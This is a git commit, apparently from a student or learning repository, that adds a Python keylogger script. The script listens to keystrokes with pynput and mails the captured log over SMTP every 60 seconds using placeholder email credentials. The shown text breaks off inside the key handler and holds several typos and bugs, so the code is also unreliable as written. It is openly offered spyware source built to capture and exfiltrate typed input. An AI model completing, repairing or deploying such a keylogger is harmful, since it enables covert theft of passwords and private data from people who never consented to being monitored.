40c7f64b716015bf3b971e157e32cb6ab2e99805
Carlos Alberto <87396518+carloslubas@users.noreply.github.com>
2025-10-24 11:00:29 -0400

    Create keylloger_email.py

---
+++ keylogger_sim/keylloger_email.py
@@ -0,0 +1,36 @@
+from pynput import keyboard
+import smtplib
+from email.mimi.text import MIMETest
+from threading import Timer
+
+# Configurar email
+EMAIL_ORIGEM = "EMAIL@XXX.XXX"
+EMAIL_ESTINO = "EMAIL.XXX.XXX"
+SENHA_EMAIL = "CODIGO APP GOOGLE PASSWORD"
+
+def enviar_email():
+  global log
+  if log:
+    msg = MIMEText(log)
+    msg['SUBJECT'] = "Dados capturados pelo keylogger"
+    msg['From'] = EMAIL_ORIGEM
+    msg['To'] = EMAIL_DESTINO
+  try:
+    server = smtplib.SMTP("smtp.XXX.XXX", 587)
+    server.starttl()
+    server.login(EMAIL_ORIGEM, SENHA_EMAIL)
+    server.send_message(msg)
+    server.quit()
+  except Exception as e:
+    print("Erro ao enviar", e)
+
+log = ""
+
+# Agendar o envio a cada 60 segundos
+Timer(60, enviar_email).start()
+
+def on_press(key):
+  global log
+  try:
+    log+= key.char
+  
